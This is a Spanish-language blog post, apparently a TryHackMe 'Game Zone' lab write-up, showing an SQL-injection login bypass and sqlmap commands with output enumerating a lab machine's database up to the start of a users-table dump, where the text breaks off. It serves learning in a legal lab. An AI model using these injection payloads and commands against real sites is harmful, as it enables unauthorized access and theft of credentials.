<!DOCTYPE html>
<html class="" lang="en"><head>
    
    <meta name="viewport" content="width=device-width" />
    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=7" />

    <link
    rel="icon"
    href='/favicon.png'
/>
<link
    rel="shortcut icon"
    href='/favicon.ico'
    type="image/x-icon"
/>
<link
    rel="apple-touch-icon"
    href='/apple-touch-icon.png'
/>

    <link
        rel="icon"
        href='/logo.svg'
        type="image/svg+xml"
    />

<title>
        
            Game Zone [TryHackMe]  &ndash;
        
        K3ssDev
:/var/log$  
    </title>
    <link href="/symbols-nerd-font/symbols-nerd-font.css" rel="stylesheet" />
    <link href="/jetbrains-mono/jetbrains-mono.css" rel="stylesheet" />
    
    
    <link type="text/css" rel="stylesheet" href=https://k3ssdev.github.io/css/styles.c5c0ca1ad04162d8cbbaa1291d7d0e5d96b9ad04a6b2b68c8ed577d7eabb970ab79d33477f3b13c760eed232f5f642bdcbce1f28bf3f057c36edf5e6c41d203c.css integrity="sha512-xcDKGtBBYtjLuqEpHX0OXZa5rQSmsraMjtV31&#43;q7lwq3nTNHfzsTx2Du0jL19kK9y84fKL8/BXw27fXmxB0gPA==" />
<meta name="author" content="Alberto Pérez" />

    
        <meta name="keywords" content='Easy, John, Linux, Metasploit, Privilege Escalation, SQLi, sqlmap, ssh-tunel, TryHackMe' />
    
    
        <meta name="description" content="o con el learning path “Offensive Pentesting¨, esta vez con una maquina sencilla que presenta un ejemplo práctico de SQL Injection con sqlmap y el uso de un túnel SSH para exponer un servicio bloqueado por firewall, para finalmente logra acceso privilegiado con Metaploit." />
    

<meta property="og:site_name"
    content='K3ssDev
:/var/log$  ' />

    <meta property="og:title" content="Game Zone [TryHackMe]" />
    <meta property="og:type" content="article" />
    
    <meta
        property="article:author" content="Alberto Pérez" />
    <meta
        property="article:published_time"
        content='2023-09-01T00:00:00Z&#43;0000' />
    
        
            <meta property="article:tag" content="Easy" />
        
            <meta property="article:tag" content="John" />
        
            <meta property="article:tag" content="Linux" />
        
            <meta property="article:tag" content="Metasploit" />
        
            <meta property="article:tag" content="Privilege Escalation" />
        
            <meta property="article:tag" content="SQLi" />
        
            <meta property="article:tag" content="sqlmap" />
        
            <meta property="article:tag" content="ssh-tunel" />
        
            <meta property="article:tag" content="TryHackMe" />
        
    
    <meta property="og:url" content="https://k3ssdev.github.io/posts/game-zone/" />
    <meta property="og:image"
        content='https://k3ssdev.github.io/images/post_pics/game-zone/game-zone.jpeg
        ' />
    
        <meta property="og:description" content="Introducción Continúo con el learning path “Offensive Pentesting¨, esta vez con una maquina sencilla que presenta un ejemplo práctico de SQL Injection con sqlma" />
    

<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:domain"
      content='k3ssdev.github.io'
/>
<meta property="twitter:url" content="https://k3ssdev.github.io/posts/game-zone/" />


    <meta name="twitter:title" content="Game Zone [TryHackMe]" />
    
    <meta name="twitter:image"
        content='https://k3ssdev.github.io/images/post_pics/game-zone/game-zone.jpeg
        ' />
    
        <meta name="twitter:description" content="Introducción Continúo con el learning path “Offensive Pentesting¨, esta vez con una maquina sencilla que presenta un ejemplo práctico de SQL Injection con sqlma" />
    

<link rel="manifest" href="/manifest/index.json" />
</head>


<body>
        <div id="baseContainer"><header class="">
<div class="titleAndSearchContainer">
        <div id="titleContainer">
            
                <a class="unstyledLink" href="/">
                    <img src='/logo.svg' />
                </a>
            
            <div class="rightOfLogo">
                <div class="titleAndHamburger">
                    <h1>
                        <a class="unstyledLink" href="/">K3ssDev
:/var/log$  </a>
                        
                    </h1>
                    
                        <label id="hamburger-menu" for="main-nav-toggler">
                            &#xf85b;
                        </label>
                    
                </div>
                <div id="wide_nav"><nav>
    
        <input type="checkbox" id="main-nav-toggler" />
    
    <ul id="main-nav">
        <li><a href="/">Home</a></li>
        
            <li><a href="/posts">Posts</a></li>
        
        
        
        
        
            <li><a href="https://k3ssdev.github.io/pages/about/">
                About
            </a></li>
        
        
        
            <li><a href="/tags">Tags</a></li>
        
        
            <li><a href="/search">Search</a></li>
        
    </ul>
</nav>
</div>
            </div>
        </div>
        <div class="search">
    <input id="searchbar" type="text" placeholder='Search' />
    <a class="nerdlink" onclick="newSearch();">&#xf002;</a>
</div>
<script>
    function newSearch() {
        let term = searchbar.value.trim();
        if (!term) return;
        location.href = `/search?q=${term}`;
    }
    searchbar.onkeyup = (ev) => {if (ev.keyCode == 13) newSearch()};
</script>

    </div>
    <div id="links">
        
        
        <a
    
        rel="noreferrer"
    
    target="_blank"
    class="nerdlink"
    href="mailto:k3ssdev@proton.me">
    
    
        &#xf6ed;
    
    <span>
        Email
    </span>
</a>
<a
    
        rel="noreferrer"
    
    target="_blank"
    class="nerdlink"
    href="https://www.linkedin.com/in/alberto-perez-del-rio/">
    
    
        &#xf0e1;
    
    <span>
        Linkedin
    </span>
</a>
<a
    
        rel="noreferrer"
    
    target="_blank"
    class="nerdlink"
    href="https://github.com/k3ssdev">
    
    
        &#xf09b;
    
    <span>
        Github
    </span>
</a>

    </div>
    
        <div id="sidebar_nav"><nav>
    
        <input type="checkbox" id="main-nav-toggler" />
    
    <ul id="main-nav">
        <li><a href="/">Home</a></li>
        
            <li><a href="/posts">Posts</a></li>
        
        
        
        
        
            <li><a href="https://k3ssdev.github.io/pages/about/">
                About
            </a></li>
        
        
        
            <li><a href="/tags">Tags</a></li>
        
        
            <li><a href="/search">Search</a></li>
        
    </ul>
</nav>
</div>
        
    
<script src="https://tryhackme.com/badge/1277295"></script>


</header>
<div id="contentContainer">
                <div id="content">
                    <main>
<article class="card single">
    
        <h1>Game Zone [TryHackMe]</h1>
    
    
        <p class="date">
            <span title='Date'> </span>
    2023-09-01

</p>
    
    
    
        <figure style="margin: 0">
            <img src="/images/post_pics/game-zone/game-zone.jpeg" alt="" />
            
        </figure>
    
    
    <div><h2 id="introducción">Introducción</h2>
<p>Continúo con el learning path “Offensive Pentesting¨, esta vez con una maquina sencilla que presenta un ejemplo práctico de SQL Injection con sqlmap y el uso de un túnel SSH para exponer un servicio bloqueado por firewall, para finalmente logra acceso privilegiado con Metaploit.</p>
<h2 id="task-1---desplegar-la-máquina">Task 1 - Desplegar la máquina</h2>
<h3 id="paso-1">Paso 1:</h3>
<ul>
<li>Pongo la máquina en marcha y accedo a la aplicación web que tiene.</li>
<li>La primera pregunta es sobre la imagen de un personaje de videojuegos que aparece en la web.</li>
</ul>
<h2 id="task-2---obtain-access-via-sqli">Task 2 - Obtain access via SQLi</h2>
<h3 id="paso-2">Paso 2:</h3>
<ul>
<li>La sala propone usar <code>' or 1=1 -- -</code> para forzar la autencicaci’on, engañando a la base de datos con 1=1 y comentando lo que haya detras con “—” para conseguirlo.</li>
<li>La consulta SQL que se ejecuta en el servidor web es la siguiente:
<ul>
<li><code>SELECT * FROM users WHERE username = ' or 1=1 -- - AND password :=</code></li>
</ul>
</li>
<li>Al conseguir hacer el bypass a la autenticación, accedo a portal.php</li>
</ul>
<h2 id="task-3---using-sqlmap">Task 3 - Using SQLMap</h2>
<h3 id="paso-3">Paso 3:</h3>
<ul>
<li>Recurrimos a SQLMap para volcar toda la base de datos de GameZone.</li>
<li>Capturo un post request buscando un juego en la web, usando burp suite, y lo guardo en un txt.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">portal</span>.<span style="color:#a6e22e">php</span> <span style="color:#a6e22e">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Host</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">10.10.62.97</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Content</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Length</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">15</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Cache</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Control</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">max</span><span style="color:#f92672">-</span><span style="color:#a6e22e">age</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Upgrade</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Insecure</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Requests</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Origin</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">http</span><span style="color:#f92672">:</span><span style="color:#75715e">//10.10.62.97
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">Content</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Type</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">application</span><span style="color:#f92672">/</span><span style="color:#a6e22e">x</span><span style="color:#f92672">-</span><span style="color:#a6e22e">www</span><span style="color:#f92672">-</span><span style="color:#a6e22e">form</span><span style="color:#f92672">-</span><span style="color:#a6e22e">urlencoded</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">User</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Agent</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">Mozilla</span><span style="color:#f92672">/</span><span style="color:#ae81ff">5.0</span> (<span style="color:#a6e22e">Windows</span> <span style="color:#a6e22e">NT</span> <span style="color:#ae81ff">10.0</span>; <span style="color:#a6e22e">Win64</span>; <span style="color:#a6e22e">x64</span>) <span style="color:#a6e22e">AppleWebKit</span><span style="color:#f92672">/</span><span style="color:#ae81ff">537.36</span> (<span style="color:#a6e22e">KHTML</span>, <span style="color:#a6e22e">like</span> <span style="color:#a6e22e">Gecko</span>) <span style="color:#a6e22e">Chrome</span><span style="color:#f92672">/</span><span style="color:#ae81ff">116.0.5845.111</span> <span style="color:#a6e22e">Safari</span><span style="color:#f92672">/</span><span style="color:#ae81ff">537.36</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Accept</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">text</span><span style="color:#f92672">/</span><span style="color:#a6e22e">html</span>,<span style="color:#a6e22e">application</span><span style="color:#f92672">/</span><span style="color:#a6e22e">xhtml</span><span style="color:#f92672">+</span><span style="color:#a6e22e">xml</span>,<span style="color:#a6e22e">application</span><span style="color:#f92672">/</span><span style="color:#a6e22e">xml</span>;<span style="color:#a6e22e">q</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0.9</span>,<span style="color:#a6e22e">image</span><span style="color:#f92672">/</span><span style="color:#a6e22e">avif</span>,<span style="color:#a6e22e">image</span><span style="color:#f92672">/</span><span style="color:#a6e22e">webp</span>,<span style="color:#a6e22e">image</span><span style="color:#f92672">/</span><span style="color:#a6e22e">apng</span>,<span style="color:#f92672">*</span><span style="color:#960050;background-color:#1e0010">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Referer</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">http</span><span style="color:#f92672">:</span><span style="color:#75715e">//10.10.62.97/portal.php
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">Accept</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Encoding</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">gzip</span>, <span style="color:#a6e22e">deflate</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Accept</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Language</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">es</span><span style="color:#f92672">-</span><span style="color:#a6e22e">ES</span>,<span style="color:#a6e22e">es</span>;<span style="color:#a6e22e">q</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0.9</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Cookie</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">PHPSESSID</span><span style="color:#f92672">=</span><span style="color:#a6e22e">nn8afcdulm4202grsvrrhspmn1</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Connection</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">close</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">searchitem</span><span style="color:#f92672">=</span><span style="color:#a6e22e">game</span>
</span></span></code></pre></div><ul>
<li>Uso sqlmap como indica sugiere la sala para hacer un volcado de la base de datos. No funciona.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">sqlmap</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">r</span> <span style="color:#a6e22e">POST_request</span>.<span style="color:#a6e22e">txt</span> <span style="color:#f92672">--</span><span style="color:#a6e22e">dbms</span><span style="color:#f92672">=</span><span style="color:#a6e22e">mysql</span> <span style="color:#f92672">--</span><span style="color:#a6e22e">dump</span>
</span></span></code></pre></div><ul>
<li>Busco sobre sqlmap y encuentro una forma diferente de hacerlo. Empiezo por extraer los nombres de las bases de datos que hay.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">sqlmap</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">u</span> <span style="color:#e6db74">&#34;http://10.10.62.97/portal.php&#34;</span> <span style="color:#f92672">--</span><span style="color:#a6e22e">data</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;searchitem=test&#34;</span> <span style="color:#f92672">--</span><span style="color:#a6e22e">dbs</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">16</span><span style="color:#f92672">:</span><span style="color:#ae81ff">03</span><span style="color:#f92672">:</span><span style="color:#ae81ff">29</span>] [<span style="color:#a6e22e">INFO</span>] <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">back</span><span style="color:#f92672">-</span><span style="color:#a6e22e">end</span> <span style="color:#a6e22e">DBMS</span> <span style="color:#a6e22e">is</span> <span style="color:#a6e22e">MySQL</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">web</span> <span style="color:#a6e22e">server</span> <span style="color:#a6e22e">operating</span> <span style="color:#a6e22e">system</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">Linux</span> <span style="color:#a6e22e">Ubuntu</span> <span style="color:#ae81ff">16.04</span> <span style="color:#a6e22e">or</span> <span style="color:#ae81ff">16.10</span> (<span style="color:#a6e22e">yakkety</span> <span style="color:#a6e22e">or</span> <span style="color:#a6e22e">xenial</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">web</span> <span style="color:#a6e22e">application</span> <span style="color:#a6e22e">technology</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">PHP</span>, <span style="color:#a6e22e">Apache</span> <span style="color:#ae81ff">2.4.18</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">back</span><span style="color:#f92672">-</span><span style="color:#a6e22e">end</span> <span style="color:#a6e22e">DBMS</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">MySQL</span> <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">5.6</span>
</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">16</span><span style="color:#f92672">:</span><span style="color:#ae81ff">03</span><span style="color:#f92672">:</span><span style="color:#ae81ff">30</span>] [<span style="color:#a6e22e">INFO</span>] <span style="color:#a6e22e">fetching</span> <span style="color:#a6e22e">database</span> <span style="color:#a6e22e">names</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">available</span> <span style="color:#a6e22e">databases</span> [<span style="color:#ae81ff">5</span>]<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] <span style="color:#a6e22e">db</span>
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] <span style="color:#a6e22e">information_schema</span>
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] <span style="color:#a6e22e">mysql</span>
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] <span style="color:#a6e22e">performance_schema</span>
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] <span style="color:#a6e22e">sys</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">16</span><span style="color:#f92672">:</span><span style="color:#ae81ff">03</span><span style="color:#f92672">:</span><span style="color:#ae81ff">30</span>] [<span style="color:#a6e22e">INFO</span>] <span style="color:#a6e22e">fetched</span> <span style="color:#a6e22e">data</span> <span style="color:#a6e22e">logged</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">text</span> <span style="color:#a6e22e">files</span> <span style="color:#a6e22e">under</span> <span style="color:#e6db74">&#39;/home/k3ss/.local/share/sqlmap/output/10.10.62.97&#39;</span>
</span></span></code></pre></div><ul>
<li>Extraigo los nombres de las tablas en db</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">sqlmap</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">u</span> <span style="color:#e6db74">&#34;http://10.10.62.97/portal.php&#34;</span> <span style="color:#f92672">--</span><span style="color:#a6e22e">data</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;searchitem=test&#34;</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">D</span> <span style="color:#a6e22e">db</span> <span style="color:#f92672">--</span><span style="color:#a6e22e">tables</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">16</span><span style="color:#f92672">:</span><span style="color:#ae81ff">08</span><span style="color:#f92672">:</span><span style="color:#ae81ff">57</span>] [<span style="color:#a6e22e">INFO</span>] <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">back</span><span style="color:#f92672">-</span><span style="color:#a6e22e">end</span> <span style="color:#a6e22e">DBMS</span> <span style="color:#a6e22e">is</span> <span style="color:#a6e22e">MySQL</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">web</span> <span style="color:#a6e22e">server</span> <span style="color:#a6e22e">operating</span> <span style="color:#a6e22e">system</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">Linux</span> <span style="color:#a6e22e">Ubuntu</span> <span style="color:#ae81ff">16.10</span> <span style="color:#a6e22e">or</span> <span style="color:#ae81ff">16.04</span> (<span style="color:#a6e22e">yakkety</span> <span style="color:#a6e22e">or</span> <span style="color:#a6e22e">xenial</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">web</span> <span style="color:#a6e22e">application</span> <span style="color:#a6e22e">technology</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">Apache</span> <span style="color:#ae81ff">2.4.18</span>, <span style="color:#a6e22e">PHP</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">back</span><span style="color:#f92672">-</span><span style="color:#a6e22e">end</span> <span style="color:#a6e22e">DBMS</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">MySQL</span> <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">5.6</span>
</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">16</span><span style="color:#f92672">:</span><span style="color:#ae81ff">08</span><span style="color:#f92672">:</span><span style="color:#ae81ff">57</span>] [<span style="color:#a6e22e">INFO</span>] <span style="color:#a6e22e">fetching</span> <span style="color:#a6e22e">tables</span> <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">database</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;db&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Database</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">db</span>
</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">2</span> <span style="color:#a6e22e">tables</span>]
</span></span><span style="display:flex;"><span><span style="color:#f92672">+-------+</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#a6e22e">post</span>  <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#a6e22e">users</span> <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+-------+</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">16</span><span style="color:#f92672">:</span><span style="color:#ae81ff">08</span><span style="color:#f92672">:</span><span style="color:#ae81ff">57</span>] [<span style="color:#a6e22e">INFO</span>] <span style="color:#a6e22e">fetched</span> <span style="color:#a6e22e">data</span> <span style="color:#a6e22e">logged</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">text</span> <span style="color:#a6e22e">files</span> <span style="color:#a6e22e">under</span> <span style="color:#e6db74">&#39;/home/k3ss/.local/share/sqlmap/output/10.10.62.97&#39;</span>
</span></span></code></pre></div><ul>
<li>Extraigo los datos de la tabla users.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">sqlmap</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">u</span> <span style="color:#e6db74">&#34;http://10.10.62.97/portal.php&#34;</span> <span style="color:#f92672">--</span><span style="color:#a6e22e">data</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;searchitem=test&#34;</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">D</span> <span style="color:#a6e22e">db</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">T</span> <span style="color:#a6e22e">users</span> <span style="color:#f92672">--</span><span style="color:#a6e22e">columns</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">16</span><span style="color:#f92672">:</span><span style="color:#ae81ff">11</span><span style="color:#f92672">:</span><span style="color:#ae81ff">58</span>] [<span style="color:#a6e22e">INFO</span>] <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">back</span><span style="color:#f92672">-</span><span style="color:#a6e22e">end</span> <span style="color:#a6e22e">DBMS</span> <span style="color:#a6e22e">is</span> <span style="color:#a6e22e">MySQL</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">web</span> <span style="color:#a6e22e">server</span> <span style="color:#a6e22e">operating</span> <span style="color:#a6e22e">system</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">Linux</span> <span style="color:#a6e22e">Ubuntu</span> <span style="color:#ae81ff">16.04</span> <span style="color:#a6e22e">or</span> <span style="color:#ae81ff">16.10</span> (<span style="color:#a6e22e">xenial</span> <span style="color:#a6e22e">or</span> <span style="color:#a6e22e">yakkety</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">web</span> <span style="color:#a6e22e">application</span> <span style="color:#a6e22e">technology</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">PHP</span>, <span style="color:#a6e22e">Apache</span> <span style="color:#ae81ff">2.4.18</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">back</span><span style="color:#f92672">-</span><span style="color:#a6e22e">end</span> <span style="color:#a6e22e">DBMS</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">MySQL</span> <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">5.6</span>
</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">16</span><span style="color:#f92672">:</span><span style="color:#ae81ff">11</span><span style="color:#f92672">:</span><span style="color:#ae81ff">58</span>] [<span style="color:#a6e22e">INFO</span>] <span style="color:#a6e22e">fetching</span> <span style="color:#a6e22e">columns</span> <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">table</span> <span style="color:#e6db74">&#39;users&#39;</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">database</span> <span style="color:#e6db74">&#39;db&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Database</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">db</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Table</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">users</span>
</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">2</span> <span style="color:#a6e22e">columns</span>]
</span></span><span style="display:flex;"><span><span style="color:#f92672">+----------+------+</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#a6e22e">Column</span>   <span style="color:#f92672">|</span> <span style="color:#a6e22e">Type</span> <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+----------+------+</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#a6e22e">pwd</span>      <span style="color:#f92672">|</span> <span style="color:#a6e22e">text</span> <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#a6e22e">username</span> <span style="color:#f92672">|</span> <span style="color:#a6e22e">text</span> <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+----------+------+</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">16</span><span style="color:#f92672">:</span><span style="color:#ae81ff">11</span><span style="color:#f92672">:</span><span style="color:#ae81ff">58</span>] [<span style="color:#a6e22e">INFO</span>] <span style="color:#a6e22e">fetched</span> <span style="color:#a6e22e">data</span> <span style="color:#a6e22e">logged</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">text</span> <span style="color:#a6e22e">files</span> <span style="color:#a6e22e">under</span> <span style="color:#e6db74">&#39;/home/k3ss/.local/share/sqlmap/output/10.10.62.97&#39;</span>
</span></span></code></pre></div><h3 id="paso-4">Paso 4</h3>
<ul>
<li>Sabiendo ya la estructura, hago el volcado con:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">sqlmap</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">u</span> <span style="color:#e6db74">&#34;http://10.10.62.97/portal.php&#34;</span> <span style="color:#f92672">--</span><span style="color:#a6e22e">data</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;searchitem=test&#34;</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">D</span> <span style="color:#a6e22e">db</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">T</span> <span style="color:#a6e22e">users</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">C</span> <span style="color:#a6e22e">pwd</span>,<span style="color:#a6e22e">username</span> <span style="color:#f92672">--</span><span style="color:#a6e22e">dump</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">16</span><span style="color:#f92672">:</span><span style="color:#ae81ff">13</span><span style="color:#f92672">:</span><span style="color:#ae81ff">41</span>] [<span style="color:#a6e22e">INFO</span>] <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">back</span><span style="color:#f92672">-</span><span style="color:#a6e22e">end</span> <span style="color:#a6e22e">DBMS</span> <span style="color:#a6e22e">is</span> <span style="color:#a6e22e">MySQL</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">web</span> <span style="color:#a6e22e">server</span> <span style="color:#a6e22e">operating</span> <span style="color:#a6e22e">system</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">Linux</span> <span style="color:#a6e22e">Ubuntu</span> <span style="color:#ae81ff">16.10</span> <span style="color:#a6e22e">or</span> <span style="color:#ae81ff">16.04</span> (<span style="color:#a6e22e">xenial</span> <span style="color:#a6e22e">or</span> <span style="color:#a6e22e">yakkety</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">web</span> <span style="color:#a6e22e">application</span> <span style="color:#a6e22e">technology</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">PHP</span>, <span style="color:#a6e22e">Apache</span> <span style="color:#ae81ff">2.4.18</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">back</span><span style="color:#f92672">-</span><span style="color:#a6e22e">end</span> <span style="color:#a6e22e">DBMS</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">MySQL</span> <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">5.6</span>
</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">16</span><span style="color:#f92672">:</span><span style="color:#ae81ff">13</span><span style="color:#f92672">:</span><span style="color:#ae81ff">41</span>] [<span style="color:#a6e22e">INFO</span>] <span style="color:#a6e22e">fetching</span> <span style="color:#a6e22e">entries</span> <span style="color:#66d9ef">of</span> <span style="color:#a6e22e">column</span>(<span style="color:#a6e22e">s</span>) <span style="color:#e6db74">&#39;pwd,username&#39;</span> <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">table</span> <span style="color:#e6db74">&#39;users&#39;</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">database</span> <span style="color:#e6db74">&#39;db&#39;</span>
